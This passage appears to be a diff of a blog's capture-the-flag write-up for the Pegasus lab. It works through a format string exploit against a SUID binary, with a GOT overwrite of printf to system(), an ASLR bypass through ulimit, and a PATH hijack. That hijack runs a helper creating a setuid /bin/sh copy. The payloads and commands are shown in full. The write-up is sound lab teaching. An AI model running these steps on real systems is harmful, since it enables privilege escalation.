+<h3 id=rebuilding-mainc>rebuilding main.c</h3>
 <p><em>This step is not essential in progressing with Pegasus, but I figured it would be an interesting approach nonetheless</em></p>
 <p>Even though the git folder did not appear to have any actual source files, one could quickly learn what it contains. For example, the git log will show you the commit history:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@pegasus:/opt/git/my_first.git$ git log
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:/opt/git/my_first.git$ git log
 commit 85365946a8142c52ee6040a029dd069b514c2ab0
-Author: Mike Ross &lt;mike@pegasus.(none)&gt;
-Date:   Tue Nov <span style="color:#f60">25</span> 04:48:01 <span style="color:#f60">2014</span> +1100
+Author: Mike Ross &lt;mike@pegasus.<span style=color:#f92672>(</span>none<span style=color:#f92672>)</span>&gt;
+Date:   Tue Nov <span style=color:#ae81ff>25</span> 04:48:01 <span style=color:#ae81ff>2014</span> +1100
 
     Committing some security fixes
 
 commit 0a8af1ed956518ec078b152ad7571105e2df26c6
-Author: John Wall &lt;john@pegasus.(none)&gt;
-Date:   Tue Nov <span style="color:#f60">25</span> 04:39:42 <span style="color:#f60">2014</span> +1100
+Author: John Wall &lt;john@pegasus.<span style=color:#f92672>(</span>none<span style=color:#f92672>)</span>&gt;
+Date:   Tue Nov <span style=color:#ae81ff>25</span> 04:39:42 <span style=color:#ae81ff>2014</span> +1100
 
     initial commit
 </code></pre></div><p>From the log we can see that there as an initial commit, and one more after that with some <em>security fixes</em>. Chances are, if we can see what the initial commit was then we can see the full initial code. So, lets check out the details of commit <em>0a8af1ed</em>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">mike@pegasus:/opt/git/my_first.git$ git show 0a8af1ed
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff>mike@pegasus:/opt/git/my_first.git$ git show 0a8af1ed
 commit 0a8af1ed956518ec078b152ad7571105e2df26c6
 Author: John Wall &lt;john@pegasus.(none)&gt;
 Date:   Tue Nov 25 04:39:42 2014 +1100
@@ -522,103 +389,103 @@ Date:   Tue Nov 25 04:39:42 2014 +1100
 diff --git a/main.c b/main.c
 new file mode 100644
 index 0000000..39c0182
---- /dev/null
-+++ b/main.c
-@@ -0,0 +1,133 @@
-+#include &lt;stdio.h&gt;
-+#include &lt;stdlib.h&gt;
-+
-+int calculator();
-+int string_replay();
-+int string_reverse();
-+int quit();
-+
-+int main()
-+{
-+    char selection[5];
-+    int sel;
-+    char * err_check;
-
+<span style=color:#f92672>--- /dev/null
+</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/main.c
+</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -0,0 +1,133 @@
+</span><span style=color:#75715e></span><span style=color:#a6e22e>+#include &lt;stdio.h&gt;
+</span><span style=color:#a6e22e>+#include &lt;stdlib.h&gt;
+</span><span style=color:#a6e22e>+
+</span><span style=color:#a6e22e>+int calculator();
+</span><span style=color:#a6e22e>+int string_replay();
+</span><span style=color:#a6e22e>+int string_reverse();
+</span><span style=color:#a6e22e>+int quit();
+</span><span style=color:#a6e22e>+
+</span><span style=color:#a6e22e>+int main()
+</span><span style=color:#a6e22e>+{
+</span><span style=color:#a6e22e>+    char selection[5];
+</span><span style=color:#a6e22e>+    int sel;
+</span><span style=color:#a6e22e>+    char * err_check;
+</span><span style=color:#a6e22e></span>
 [... snip ...]
 </code></pre></div><p>Nice! We have a file <code>main.c</code> that was added. I copied the diff and saved it to <code>init.patch</code>, and then ran the patch:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# patch -p1 &lt; init.diff
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# patch -p1 &lt; init.diff
 patching file main.c
 </code></pre></div><p>That gives us the state of files after commit <em>0a8af1ed</em> which was labeled as the initial commit. The same process was followed for the next commit <em>85365946a8</em> which apparently included some <em>security fixes</em>. Copy the diff, make the .patch file and apply it. After this process, we have the sources up to where the git commit history has it.</p>
 <p>I inspected that code before and after the security fixes commit, and noticed that the security fixes fixed a potential format string vulnerability. At least, that was the one my untrained eye was able to spot:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">diff --git a/main.c b/main.c
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff>diff --git a/main.c b/main.c
 index 39c0182..b6b2ed4 100644
---- a/main.c
-+++ b/main.c
-@@ -8,7 +8,7 @@ int quit();
-
+<span style=color:#f92672>--- a/main.c
+</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/main.c
+</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -8,7 +8,7 @@ int quit();
+</span><span style=color:#75715e></span>
 [... snip ...]
-+
-         printf(&#34;Enter second number: &#34;);
+<span style=color:#a6e22e>+
+</span><span style=color:#a6e22e></span>         printf(&#34;Enter second number: &#34;);
          if (fgets(numberB, sizeof numberB, stdin) != NULL)
          {
--            int numA = strtol(numberA, &amp;err_check, 10);
-             int numB = strtol(numberB, &amp;err_check, 10);
+<span style=color:#f92672>-            int numA = strtol(numberA, &amp;err_check, 10);
+</span><span style=color:#f92672></span>             int numB = strtol(numberB, &amp;err_check, 10);
              if (*err_check != &#39;\n&#39;)
              {
--                printf(&#34;Error details: &#34;);
--                printf(err_check);
-+                printf(&#34;Error details: %s&#34;, err_check);
-                 printf(&#34;\n&#34;);
+<span style=color:#f92672>-                printf(&#34;Error details: &#34;);
+</span><span style=color:#f92672>-                printf(err_check);
+</span><span style=color:#f92672></span><span style=color:#a6e22e>+                printf(&#34;Error details: %s&#34;, err_check);
+</span><span style=color:#a6e22e></span>                 printf(&#34;\n&#34;);
                  return 1;
 [... snip ...]
-</code></pre></div><p><code>printf(err_check);</code> is the potentially vulnerable call&hellip; I think.</p>
-<h3 id="the-calculator-with-a-hole">the calculator with a hole</h3>
+</code></pre></div><p><code>printf(err_check);</code> is the potentially vulnerable call&mldr; I think.</p>
+<h3 id=the-calculator-with-a-hole>the calculator with a hole</h3>
 <p>After toying with the git repository, my attention turned back to the SUID binary. When I run <code>my_first</code>, I am actually running it as <code>john</code>. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain <code>john</code>&rsquo;s privileges! Sounds easy right. :P</p>
 <p>I quickly realized that the <code>main.c</code> file I got out of the git repository, was the sources for the <code>my_first</code> binary. So, my focus shifted to the piece of code I saw the security fix for.</p>
 <p>First, it was time to confirm my suspicion of a format string vulnerability:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@pegasus:~$ ./my_first
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ ./my_first
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
+<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
+<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
+<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit
 
-Selection: <span style="color:#f60">1</span>
+Selection: <span style=color:#ae81ff>1</span>
 
-Enter first number: <span style="color:#f60">1</span>
+Enter first number: <span style=color:#ae81ff>1</span>
 Enter second number: %x
 Error details: bf96cbec
 
 Selection:
 </code></pre></div><p>I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.</p>
 <p>Anyways, feels aside, it was time to work on a exploit.</p>
-<p>For the format string exploit, I don&rsquo;t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about <a href="https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/">Xerxes2</a> which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.</p>
-<p><strong>EDIT</strong> I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies. <!-- raw HTML omitted --><!-- raw HTML omitted --></p>
-<h3 id="punching-more-than-numbers">punching more than numbers</h3>
-<p><em>So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to <code>my_first</code>&rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to <a href="https://twitter.com/barrebas">@barrebas</a> for subtly pointing the fail out ;p</em></p>
+<p>For the format string exploit, I don&rsquo;t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about <a href=https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/>Xerxes2</a> which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.</p>
+<p><strong>EDIT</strong> I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies. </p>
+<h3 id=punching-more-than-numbers>punching more than numbers</h3>
+<p><em>So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to <code>my_first</code>&rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to <a href=https://twitter.com/barrebas>@barrebas</a> for subtly pointing the fail out ;p</em></p>
 <p>As I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for <code>printf()</code> using the format string to <code>system()</code> instead. This means, the next time <code>printf()</code> is called, it would actually execute <code>system()</code> with the adjacent argument on the stack. Lets see how this was done.</p>
-<h4 id="compiling-the-format-string">compiling the format string</h4>
+<h4 id=compiling-the-format-string>compiling the format string</h4>
 <p>We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the <code>./my_first</code> binary to sample a successful run:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@pegasus:~$ printf <span style="color:#87ceeb">&#39;1\n1\n1\n4\n&#39;</span> | ./my_first
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\n1\n4\n&#39;</span> | ./my_first
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
+<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
+<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
+<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit
 
 Selection:
-Enter first number: Enter second number: Result: <span style="color:#f60">1</span> + <span style="color:#eedd82">1</span> = <span style="color:#f60">2</span>
+Enter first number: Enter second number: Result: <span style=color:#ae81ff>1</span> + 1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
 
 Selection:
 Goodbye!
 </code></pre></div><p>Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A&rsquo;s, and then incrementing the format string arguments by 1 until we can find the 4 A&rsquo;s. In my case, I will be formatting them as hex with <code>%x</code>, so I am searching for <code>41414141</code>. The format string will therefore start as <code>AAAA.0x%s</code>. Note that in the below example we are using 2 x percentages (2 x &lsquo;%') as it needs to be escaped in the shell:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@pegasus:~$ printf <span style="color:#87ceeb">&#39;1\n1\nAAAA.0x%%x\n4\n&#39;</span> | ./my_first
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\nAAAA.0x%%x\n4\n&#39;</span> | ./my_first
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
+<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
+<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
+<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit
 
 Selection:
 Enter first number: Enter second number: Error details: AAAA.0xbff5321c
@@ -627,14 +494,14 @@ Selection:
 Goodbye!
 </code></pre></div><p>And we have the output of <code>AAAA.0xbff5321c</code>. Yay :)
 Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A&rsquo;s:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@pegasus:~$ printf <span style="color:#87ceeb">&#39;1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n&#39;</span> | ./my_first
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n&#39;</span> | ./my_first
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
+<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
+<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
+<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit
 
 Selection:
 Enter first number: Enter second number: Error details: AAAA.0xbfbd145c0xa0xb75b41600xb7726ac00xb7752ff40xb77539180xbfbd14600x41414141
@@ -643,14 +510,14 @@ Selection:
 Goodbye!
 mike@pegasus:~$
 </code></pre></div><p>So, using direct parameter access in the format string, we can reference parameter 8 directly:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@pegasus:~$ printf <span style="color:#87ceeb">&#39;1\n1\nAAAA.0x%%8$x\n4\n&#39;</span> | ./my_first
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\nAAAA.0x%%8$x\n4\n&#39;</span> | ./my_first
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
+<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
+<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
+<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit
 
 Selection:
 Enter first number: Enter second number: Error details: AAAA.0x41414141
@@ -660,7 +527,7 @@ Goodbye!
 mike@pegasus:~$
 </code></pre></div><p>Parameter 8 in the format string is the start of the section on the stack we can read now, shown in the output <code>AAAA.0x41414141</code> of the format string <code>AAAA.0x%8$x</code>.</p>
 <p>Now we will move on to making use of the <code>%n</code> format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for <code>printf()</code> occurs ofc! Lets dump the GOT for <code>./my_first</code>, and determine where it will go look for <code>printf()</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@pegasus:~$ objdump -R ./my_first
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ objdump -R ./my_first
 
 ./my_first:     file format elf32-i386
 
@@ -677,190 +544,190 @@ OFFSET   TYPE              VALUE
 08049c14 R_386_JUMP_SLOT   strtol
 </code></pre></div><p>The location of <code>printf()</code> will be looked up at <code>08049bfc</code>. This is the part where we want to rewrite the address of <code>printf()</code> to that of libc&rsquo;s <code>system()</code>.</p>
 <p>The last part we need is to know where <code>system()</code> actually is. An important vector that may influence this position in memory is known as ASLR, which will effectively cause the address of <code>system()</code> to be different every time <code>./my_first</code> is run. To combat this, a neat little trick to increase the stack size can be used using <code>ulimit</code>. <code>ulimit -s unlimited</code> will maximize the stack size, effectively causing the ASLR to be practically nonexistent:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@pegasus:~$ ulimit -s
-<span style="color:#f60">8192</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ ulimit -s
+<span style=color:#ae81ff>8192</span>
 mike@pegasus:~$ ulimit -s unlimited
 mike@pegasus:~$ ulimit -s
 unlimited
 </code></pre></div><p>With the ASLR problem out of the way, lets leak the address of <code>system()</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0"># fire up gdb</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># fire up gdb</span>
 mike@pegasus:~$ gdb -q ./my_first
-Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
+Reading symbols from /home/mike/my_first...<span style=color:#f92672>(</span>no debugging symbols found<span style=color:#f92672>)</span>...done.
 
-<span style="color:#0f0"># set a break point as we enter main()</span>
-(gdb) b main
-Breakpoint <span style="color:#f60">1</span> at 0x804850f
+<span style=color:#75715e># set a break point as we enter main()</span>
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b main
+Breakpoint <span style=color:#ae81ff>1</span> at 0x804850f
 
-<span style="color:#0f0"># run the binary</span>
-(gdb) r
+<span style=color:#75715e># run the binary</span>
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r
 Starting program: /home/mike/my_first
 
-Breakpoint 1, 0x0804850f in main ()
+Breakpoint 1, 0x0804850f in main <span style=color:#f92672>()</span>
 
-<span style="color:#0f0"># leak the current address of system()</span>
-(gdb) p system
-<span style="color:#eedd82">$1</span> = {&lt;text variable, no debug info&gt;} 0x40069060 &lt;system&gt;
-(gdb)
+<span style=color:#75715e># leak the current address of system()</span>
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p system
+$1 <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>&lt;text variable, no debug info&gt;<span style=color:#f92672>}</span> 0x40069060 &lt;system&gt;
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
 </code></pre></div><p>And so we learn that <code>system()</code> lives at <code>0x40069060</code>. What does this all mean so far then? Well, we are now going to use the format string vulnerability to write (using <code>%n</code>) a new address for <code>printf()</code> in the GOT at <code>08049bfc</code> to point to <code>system()</code> at <code>0x40069060</code> instead of its real location.</p>
 <p>For us to debug the application while we prepare the required padding for the format string, we will use the <code>printf()</code> used to pipe to <code>./my_first</code> to redirect to a file instead. Then, in <code>gdb</code>, we will run the binary, redirecting the input from the file we will compile with the <code>printf()</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0"># so, instead of the 4 x A&#39;s, we will now place the address</span>
-<span style="color:#0f0"># in the GOT that we want to override, and use the %x format</span>
-<span style="color:#0f0"># string to attempt writing to it</span>
-mike@pegasus:~$ printf <span style="color:#87ceeb">&#39;1\n1\n\xfc\x9b\x04\x08%%8$n&#39;</span> &gt; t
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># so, instead of the 4 x A&#39;s, we will now place the address</span>
+<span style=color:#75715e># in the GOT that we want to override, and use the %x format</span>
+<span style=color:#75715e># string to attempt writing to it</span>
+mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\n\xfc\x9b\x04\x08%%8$n&#39;</span> &gt; t
 mike@pegasus:~$ file t
 t: data
 
-<span style="color:#0f0"># then, in gdb, we will grab the output of the new file called</span>
-<span style="color:#0f0"># t, and redirect it as input to my_first</span>
+<span style=color:#75715e># then, in gdb, we will grab the output of the new file called</span>
+<span style=color:#75715e># t, and redirect it as input to my_first</span>
 mike@pegasus:~$ gdb -q ./my_first
-Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
+Reading symbols from /home/mike/my_first...<span style=color:#f92672>(</span>no debugging symbols found<span style=color:#f92672>)</span>...done.
 
-<span style="color:#0f0"># leak the current address that GOT points to for printf()</span>
-(gdb) x/x 0x08049bfc
+<span style=color:#75715e># leak the current address that GOT points to for printf()</span>
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/x 0x08049bfc
 0x8049bfc &lt;printf@got.plt&gt;: 0x080483b6
 
-<span style="color:#0f0"># run the binary with our exploit (t) as input</span>
-(gdb) r &lt; t
+<span style=color:#75715e># run the binary with our exploit (t) as input</span>
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r &lt; t
 Starting program: /home/mike/my_first &lt; t
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
+<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
+<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
+<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit
 
 Selection:
 Enter first number: Enter second number: Error details: ��
 
 Program received signal SIGSEGV, Segmentation fault.
-0x00000004 in ?? ()
+0x00000004 in ?? <span style=color:#f92672>()</span>
 
-<span style="color:#0f0"># inspect the new address the GOT points to for printf()</span>
-(gdb) x/x 0x08049bfc
+<span style=color:#75715e># inspect the new address the GOT points to for printf()</span>
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/x 0x08049bfc
 0x8049bfc &lt;printf@got.plt&gt;: 0x00000004
-(gdb)
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
 </code></pre></div><p>This is working exactly as expected. Now all that is left is to pad the format string so that we can have the address <code>0x40069060</code> instead of <code>0x00000004</code> written. For the math etc involved, refer to the Xerxes2 post I previously mentioned. The resultant format string was <code>\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n</code>, with a run in the debugger ending in:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0"># prep the input file</span>
-mike@pegasus:~$ printf <span style="color:#87ceeb">&#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39;</span> &gt; t
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># prep the input file</span>
+mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39;</span> &gt; t
 mike@pegasus:~$
 
-<span style="color:#0f0"># run it in the debugger</span>
-(gdb) r &lt;t
+<span style=color:#75715e># run it in the debugger</span>
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r &lt;t
 The program being debugged has been started already.
-Start it from the beginning? (y or n) y
+Start it from the beginning? <span style=color:#f92672>(</span>y or n<span style=color:#f92672>)</span> y
 Starting program: /home/mike/my_first &lt;t
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
+<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
+<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
+<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit
 
 Selection:
 Enter first number: Enter second number: Error details: ����
 
-[... snip ...]
+<span style=color:#f92672>[</span>... snip ...<span style=color:#f92672>]</span>
 
 sh: 1: Selection:: not found
 
 Program received signal SIGSEGV, Segmentation fault.
-0x08c3f98c in ?? ()
+0x08c3f98c in ?? <span style=color:#f92672>()</span>
 
-<span style="color:#0f0"># check where the GOT points to for printf()</span>
-(gdb) x/x 0x08049bfc
+<span style=color:#75715e># check where the GOT points to for printf()</span>
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/x 0x08049bfc
 0x8049bfc &lt;printf@got.plt&gt;: 0x40069060
 
-<span style="color:#0f0"># confirm system() is still there :)</span>
-(gdb) p system
-<span style="color:#eedd82">$1</span> = {&lt;text variable, no debug info&gt;} 0x40069060 &lt;system&gt;
-</code></pre></div><p>The binary crashes with <code>sh: 1: Selection:: not found</code>, meaning that it is now trying to run <code>system(&quot;Selection:&quot;)</code> instead of <code>printf(&quot;Selection:&quot;)</code> due to the GOT override.</p>
-<h4 id="finishing-the-exploit">finishing the exploit</h4>
+<span style=color:#75715e># confirm system() is still there :)</span>
+<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p system
+$1 <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>&lt;text variable, no debug info&gt;<span style=color:#f92672>}</span> 0x40069060 &lt;system&gt;
+</code></pre></div><p>The binary crashes with <code>sh: 1: Selection:: not found</code>, meaning that it is now trying to run <code>system("Selection:")</code> instead of <code>printf("Selection:")</code> due to the GOT override.</p>
+<h4 id=finishing-the-exploit>finishing the exploit</h4>
 <p>From here the exploit is pretty easy. We can use some $PATH trickery in our current shell to get <code>Selection:</code> to actually mean something, like prepare a small SUID C shell perhaps? :)</p>
 <p>I quickly compiled some C wrapper code to prepare a shell and ran the exploit.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0"># Prep Selection: to make a SUID shell for john</span>
-<span style="color:#0f0"># and modify PATH</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># Prep Selection: to make a SUID shell for john</span>
+<span style=color:#75715e># and modify PATH</span>
 mike@pegasus:~$ cat tojohn.c
-<span style="color:#0f0">#include &lt;stdio.h&gt;</span>
-int main()
-{
-    system(<span style="color:#87ceeb">&#34;cp /bin/sh /tmp/tojohn&#34;</span>);
-    system(<span style="color:#87ceeb">&#34;chmod 4777 /tmp/tojohn&#34;</span>);
-}
-mike@pegasus:~$ gcc tojohn.c -o <span style="color:#87ceeb">&#34;Selection:&#34;</span>
-mike@pegasus:~$ export <span style="color:#eedd82">PATH</span>=/home/mike/:<span style="color:#eedd82">$PATH</span>
+<span style=color:#75715e>#include &lt;stdio.h&gt;</span>
+int main<span style=color:#f92672>()</span>
+<span style=color:#f92672>{</span>
+    system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;cp /bin/sh /tmp/tojohn&#34;</span><span style=color:#f92672>)</span>;
+    system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;chmod 4777 /tmp/tojohn&#34;</span><span style=color:#f92672>)</span>;
+<span style=color:#f92672>}</span>
+mike@pegasus:~$ gcc tojohn.c -o <span style=color:#e6db74>&#34;Selection:&#34;</span>
+mike@pegasus:~$ export PATH<span style=color:#f92672>=</span>/home/mike/:$PATH
 
